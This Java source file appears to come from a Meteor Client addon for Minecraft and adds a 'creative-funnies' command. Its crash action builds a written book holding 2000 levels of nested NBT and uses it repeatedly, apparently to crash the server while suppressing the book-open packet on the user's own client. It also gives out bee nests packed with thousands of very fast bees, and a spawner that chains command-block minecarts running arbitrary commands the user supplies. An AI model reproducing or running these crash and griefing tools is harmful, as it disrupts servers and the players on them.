package addon.antip2w.commands.CreativeFunnies;

import addon.antip2w.utils.CreativeUtils;
import com.mojang.brigadier.arguments.BoolArgumentType;
import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import meteordevelopment.meteorclient.commands.Command;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.s2c.play.OpenWrittenBookS2CPacket;
import net.minecraft.text.Text;
import net.minecraft.util.Hand;

import static com.mojang.brigadier.Command.SINGLE_SUCCESS;

public class CreativeFunnies extends Command {
    private static final MinecraftClient mc = MinecraftClient.getInstance();
    private boolean cancelNextBookPacket = false;

    public CreativeFunnies() {
        super("creative-funnies", "Do funny things in creative mode", "cf");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(
            literal("action")
                .then(
                    literal("crash")
                        .executes(
                            ctx -> crash(1)
                        )
                        .then(
                            argument("strength", IntegerArgumentType.integer(1))
                                .executes(
                                    ctx -> crash(IntegerArgumentType.getInteger(ctx, "strength"))
                                )
                        )
                )
        ).then(
            literal("item")
                .then(
                    literal("bees")
                        .executes(
                            ctx -> getBees(1000, true)
                        )
                        .then(
                            argument("amount", IntegerArgumentType.integer(1))
                                .executes(
                                    ctx -> getBees(IntegerArgumentType.getInteger(ctx, "amount"), true)
                                )
                                .then(
                                    argument("stronger", BoolArgumentType.bool())
                                        .executes(
                                            ctx -> getBees(IntegerArgumentType.getInteger(ctx, "amount"), BoolArgumentType.getBool(ctx, "stronger"))
                                        )
                                )
                        )
                ).then(
                    literal("cmdspawner")
                        .then(
                            argument("commands", StringArgumentType.greedyString())
                                .executes(
                                    ctx -> getCommandSpawner(StringArgumentType.getString(ctx, "commands"))
                                )
                        )
                )
        );
    }

    private int getCommandSpawner(String commandstogether) {
        String[] commands = commandstogether.split("\\|");
        StringBuilder minecarts = new StringBuilder();
        for (String command : commands) minecarts.append("{id: 'minecraft:command_block_minecart', Command: '%s'},".formatted(command));
        String nbt = "{BlockEntityTag:{SpawnCount:1,SpawnRange:0,Delay:0,SpawnData:{entity:{id:'minecraft:falling_block',BlockState:{Name:'minecraft:redstone_block'},Time:1,Passengers:[{id:'minecraft:falling_block',BlockState:{Name:'minecraft:activator_rail'},Time:1,Motion:[0.0,0.35,0.0],Passengers:[" + minecarts + "]}]}}}}";
        CreativeUtils.giveItemWithNbtToEmptySlot(Items.SPAWNER, nbt, Text.of("Place me!"), 1);
        return SINGLE_SUCCESS;
    }

    private int getBees(int amount, boolean stronger) {
        NbtCompound nbt, bee;
        try {
            nbt = StringNbtReader.parse("{BlockEntityTag:{Bees:[]}}");
            if(stronger) bee = StringNbtReader.parse("{EntityData:{Attributes:[{Base:1000000.0d,Name:'minecraft:generic.movement_speed'}], id:'minecraft:bee'}, TicksInHive:2400}");
            else bee = StringNbtReader.parse("{EntityData:{id:'minecraft:bee'}, TicksInHive:2400}");
        } catch (CommandSyntaxException e) {
            throw new RuntimeException(e);
        }

        for (int i = 0; i < amount; i++) {
            nbt.getCompound("BlockEntityTag").getList("Bees", 10).addElement(i, bee);
        }

        CreativeUtils.giveItemWithNbtToEmptySlot(Items.BEE_NEST, nbt.asString(), Text.of("Bees.zip (%d)".formatted(amount)), 1);
        return SINGLE_SUCCESS;
    }

    @EventHandler
    private void onPacket(PacketEvent.Receive event) {
        if (cancelNextBookPacket && event.packet instanceof OpenWrittenBookS2CPacket) {
            event.cancel();
            cancelNextBookPacket = false;
        }
    }

    @EventHandler
    private void onDisconnect(GameLeftEvent event) {
         cancelNextBookPacket = false;
    }

    private int crash(int strength) {
        if(!mc.player.isCreative()) {
            ChatUtils.warning("Not in creative");
            return SINGLE_SUCCESS;
        }
        String nbt = "{pages:[\"{\\\"nbt\\\":\\\"" + "a:{".repeat(2000) + "}".repeat(2000) + "\\\",\\\"entity\\\":\\\"" + mc.player.getUuid() + "\\\"}\"],title:\"0\",author:\"" + mc.player.getGameProfile().getName() + "\"}";
        for (int i = 0; i < strength; i++) {
            CreativeUtils.giveItemWithNbtToSelectedSlot(Items.WRITTEN_BOOK, nbt, Text.of("bye"), 1);
            mc.interactionManager.interactItem(mc.player, Hand.MAIN_HAND);
        }
        return SINGLE_SUCCESS;
    }
}
